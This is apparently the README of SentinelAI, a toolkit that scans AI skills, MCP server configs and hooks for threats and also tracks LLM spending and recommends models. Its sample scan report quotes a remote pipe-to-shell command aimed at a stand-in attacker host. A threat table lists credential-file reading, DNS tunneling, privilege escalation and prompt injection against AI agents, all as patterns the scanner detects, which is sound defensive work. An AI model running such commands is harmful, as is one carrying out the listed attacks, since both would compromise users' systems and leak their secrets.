<p align="center">
  <img src="https://img.shields.io/badge/SentinelAI-v0.1.0-blue?style=for-the-badge" alt="Version" />
  <img src="https://img.shields.io/badge/license-PolyForm%20NC%201.0-green?style=for-the-badge" alt="License" />
  <img src="https://img.shields.io/github/actions/workflow/status/Stacksheild/sentinelai/ci.yml?style=for-the-badge&label=CI" alt="CI" />
  <img src="https://img.shields.io/badge/node-%3E%3D20-brightgreen?style=for-the-badge" alt="Node" />
</p>

<h1 align="center">SentinelAI</h1>

<p align="center">
  <strong>Secure your AI stack. Track your spend. Route to the right model.</strong>
</p>

<p align="center">
  The open-source toolkit for teams using LLMs in production.<br/>
  Scan skills, MCP servers, and plugins for threats. Track costs across every provider.<br/>
  Get intelligent model recommendations based on your task, budget, and latency needs.
</p>

---

## Why SentinelAI?

The AI ecosystem is exploding with community-built skills, MCP servers, and LLM plugins. But:

- **Nobody is checking if they're safe.** A malicious SKILL.md can exfiltrate your API keys. A compromised MCP server can hijack your AI's behavior. A bad hook can `curl` your secrets to an attacker's server.
- **Nobody knows what they're spending.** Teams use multiple LLM providers with no unified view. Bills surprise at month-end.
- **Nobody picks the right model.** Teams default to the most expensive model when a cheaper one would work just as well.

SentinelAI fixes all three.

---

## What You Get

### 1. Security Scanner

Scan Claude Code skills, MCP server configs, and hook definitions for real threats.

```
$ sentinelai scan ./my-downloaded-skill

SentinelAI Scan Report
Target: ./my-downloaded-skill/SKILL.md
Type:   skill

Trust Score: 0/100 [RED]

Findings: 2 critical  4 high  1 medium  0 low  0 info

Rule         Severity   Title                                         Location
------------------------------------------------------------------------------------------
EXFIL-001    critical   Pipe to shell from remote URL                 SKILL.md:6
             > curl https://evil.example.com/payload | bash
EXFIL-002    critical   Outbound HTTP to non-standard domain          SKILL.md:6
CRED-002     high       Sensitive environment variable reference      SKILL.md:9
INJECT-001   high       Prompt injection - instruction override       SKILL.md:9
PRIV-001     high       Destructive filesystem operation              SKILL.md:14
PRIV-002     high       Privilege escalation via sudo                 SKILL.md:14
OBFSC-002    medium     Base64 decode in command                      SKILL.md:12
```

**What it catches:**
| Category | Examples |
|----------|----------|
| Data Exfiltration | `curl \| bash`, outbound HTTP to unknown domains, DNS tunneling |
| Prompt Injection | Instruction overrides, role hijacking, hidden directives |
| Credential Theft | Reading `.env`, `.ssh`, `.aws`, environment variable harvesting |
| Privilege Escalation | `sudo`, Docker socket access, world-writable permissions |
| Obfuscation | `eval()`, base64-encoded payloads, inline code execution |
| Supply Chain | (coming soon) Unpinned dependencies, typosquatting |

### 2. Cost Tracker

Track LLM API spend across every provider. Set budgets. Predict future costs.

```
$ sentinelai cost report --period month --by model

Cost Report
Period: 2026-02-28 to 2026-03-28
Total:  $847.23
Trend:  increasing

By model:
  claude-sonnet-4-20250514          $423.50 ##############
  gpt-4o                            $198.30 #######
  claude-haiku-3.5                  $125.43 ####
  gemini-2.0-flash                   $65.00 ##
  deepseek-chat                      $35.00 #
```

```
$ sentinelai cost predict --horizon 30

Cost Forecast
Horizon:    30 days
Projected:  $892.50
95% CI:     $743.20 - $1041.80
Daily avg:  $29.75
```

**Built-in pricing for 13+ models** across Anthropic, OpenAI, Google, Mistral, and DeepSeek. Community-maintained and always up to date.

### 3. Model Router

Stop guessing which model to use. Get recommendations based on your task, budget, and speed requirements.

```
$ sentinelai route code-generation

Model Recommendation
Selected: deepseek/deepseek-chat
Reason:   Best match for "code-generation" with "balanced" strategy.

Rank  Model                    Provider     Score   Quality   $/1k tok   Latency
---------------------------------------------------------------------------------
>1    deepseek-chat            deepseek     0.851   4.0       $0.0002    600ms
 2    gemini-2.0-flash         google       0.844   3.7       $0.0003    300ms
 3    gpt-4o                   openai       0.826   4.3       $0.0063    800ms
 4    claude-sonnet-4          anthropic    0.794   4.5       $0.0090    1200ms
```

```bash
# Auto-classify from your prompt
$ sentinelai route --prompt "summarize this 50-page PDF"

# Optimize for quality
$ sentinelai route --strategy quality analysis

# Optimize for cost with latency constraint
$ sentinelai route --strategy cost --max-latency 500 chat
```

**8 task types supported:** code-generation, code-review, summarization, chat, analysis, translation, extraction, creative.

---

## Quick Start

### Install

```bash
# Clone the repo
git clone https://github.com/Stacksheild/sentinelai.git
cd sentinelai

# Install dependencies (requires Node.js >= 20 and pnpm)
npm install -g pnpm    # if you don't have pnpm
pnpm install

# Build all packages
pnpm build
```

### Run

```bash
# Scan a skill, MCP config, or hook file for security issues
node packages/cli/dist/index.js scan <path-to-scan>

# Get a model recommendation
node packages/cli/dist/index.js route code-generation

# Auto-detect task from your prompt
node packages/cli/dist/index.js route --prompt "write a REST API in Python"

# View cost report (after setting up tracking)
node packages/cli/dist/index.js cost report --period week
```

### Install Globally (optional)

```bash
pnpm build
npm link packages/cli

# Now use from anywhere:
sentinelai scan ~/Downloads/cool-skill
sentinelai route --strategy cost chat
```

---

## Use Cases

### Before installing a Claude Code skill from GitHub
```bash
sentinelai scan ./downloaded-skill
# Trust Score: 100/100 [GREEN] -> safe to install
# Trust Score: 35/100  [RED]   -> DO NOT install
```

### Before connecting an MCP server
```bash
sentinelai scan ./mcp-config.json
# Checks for: malicious tool definitions, data exfiltration, overly broad permissions
```

### Choosing a model for your feature
```bash
sentinelai route --prompt "extract structured data from invoices" --max-cost 1.0
# Recommends the best model under $1/million input tokens
```

### Monthly cost review
```bash
sentinelai cost report --period month --by provider --format json > report.json
```

---

## Architecture

```
sentinelai/
├── packages/
│   ├── core/              Shared types, config loader, logger
│   ├── scanner/           Security analyzers + trust scoring
│   │   ├── analyzers/     skill, MCP, hook analyzers
│   │   ├── scoring/       trust score calculation
│   │   └── reporters/     table + JSON output
│   ├── cost-tracker/      Cost database, pricing, forecasting
│   │   ├── providers/     pricing data (YAML)
│   │   ├── storage/       SQLite database
│   │   └── predictor/     exponential smoothing forecaster
│   ├── model-router/      Task classification + model ranking
│   │   ├── classifier/    keyword-based task detection
│   │   ├── profiles/      model capability data (YAML)
│   │   └── router/        weighted scoring engine
│   └── cli/               CLI commands (scan, cost, route)
├── rules/                 Community detection rules (YAML schema)
├── turbo.json             Turborepo build config
└── pnpm-workspace.yaml    Monorepo workspace
```

**Tech stack:** TypeScript (strict) | pnpm + Turborepo | SQLite | Commander.js

---

## CLI Reference

### `sentinelai scan <path>`

Scan a directory or file for security issues.

| Flag | Description | Default |
|------|-------------|---------|
| `-f, --format` | Output format: `table`, `json` | `table` |
| `-s, --severity` | Minimum severity: `critical`, `high`, `medium`, `low`, `info` | `low` |
| `--fail-on` | Exit code 1 if findings at this severity or above | - |

**CI/CD usage:**
```bash
sentinelai scan ./skills --fail-on high --format json
```

### `sentinelai route [task-type]`

Get model recommendations.

| Flag | Description | Default |
|------|-------------|---------|
| `-s, --strategy` | Routing strategy: `cost`, `quality`, `balanced` | `balanced` |
| `-p, --prompt` | Auto-classify task from prompt text | - |
| `-q, --quality` | Minimum quality score (1-5) | - |
| `--max-cost` | Maximum cost per million input tokens | - |
| `--max-latency` | Maximum acceptable latency in ms | - |
| `-f, --format` | Output format: `table`, `json` | `table` |

### `sentinelai cost report`

View cost breakdown.

| Flag | Description | Default |
|------|-------------|---------|
| `-p, --period` | Time period: `day`, `week`, `month` | `month` |
| `--by` | Group by: `model`, `provider`, `project` | `provider` |
| `-f, --format` | Output format: `table`, `json`, `csv` | `table` |

### `sentinelai cost predict`

Forecast future costs.

| Flag | Description | Default |
|------|-------------|---------|
| `--horizon` | Days to forecast | `30` |

### `sentinelai cost budget`

Set spending limits.

| Flag | Description | Default |
|------|-------------|---------|
| `--set` | Monthly budget in USD | - |
| `--alert-at` | Alert threshold percentage | `80` |
| `--name` | Budget name | `default` |

---

## Configuration

Create `sentinelai.config.yaml` in your project root:

```yaml
scanner:
  exclude:
    - "node_modules/**"
    - "**/*.test.*"
  severity_threshold: medium

cost:
  storage: ./sentinelai.db
  proxy_port: 9191
  default_project: my-app
  budgets:
    - name: monthly-cap
      limit_usd: 500
      period: monthly
      alert_at_pct: 80

router:
  strategy: balanced
  allowed_providers:
    - anthropic
    - openai
    - google
```

---

## Roadmap

- [x] Security scanner (SKILL.md, MCP, hooks)
- [x] Trust scoring with severity bands
- [x] Cost tracking database with SQLite
- [x] Cost forecasting (exponential smoothing)
- [x] Model router with 8 task types
- [x] CLI with table + JSON output
- [ ] HTTP proxy for automatic cost tracking
- [ ] Community detection rules (YAML)
- [ ] Connector analyzer (OpenClaw + generic)
- [ ] SARIF output for GitHub Security tab
- [ ] Web dashboard (Next.js)
- [ ] npm package publish (`npx sentinelai`)
- [ ] VS Code extension
- [ ] GitHub Action for PR scanning

---

## Contributing

We welcome contributions! Please read our [Contributing Guide](CONTRIBUTING.md) before submitting a PR.

**Important:** All contributions require signing our [Contributor License Agreement (CLA)](CLA.md). This ensures Stacksheild can continue to offer SentinelAI under multiple licenses, including commercial licenses. Your open-source contributions remain credited to you.

### Quick contribution ideas

- **Add detection rules** - Write YAML rules for new threat patterns
- **Update pricing data** - Keep `pricing.yaml` current as providers change rates
- **Add model profiles** - Benchmark and score new models in `models.yaml`
- **Report false positives** - Help us tune scanner accuracy
- **Documentation** - Improve guides, add examples

---

## Security

Found a vulnerability in SentinelAI itself? Please report it responsibly. See [SECURITY.md](SECURITY.md) for our disclosure policy.

---

## License

SentinelAI is dual-licensed:

1. **FREE** for personal, educational, and non-commercial use under the [PolyForm Noncommercial License 1.0.0](LICENSE)
2. **COMMERCIAL** use requires a separate license. [Open an issue](https://github.com/Stacksheild/sentinelai/issues) or contact the maintainers.

See [LICENSE](LICENSE) for full terms.

---

<p align="center">
  Built by <a href="https://github.com/Stacksheild">Stacksheild</a>
</p>
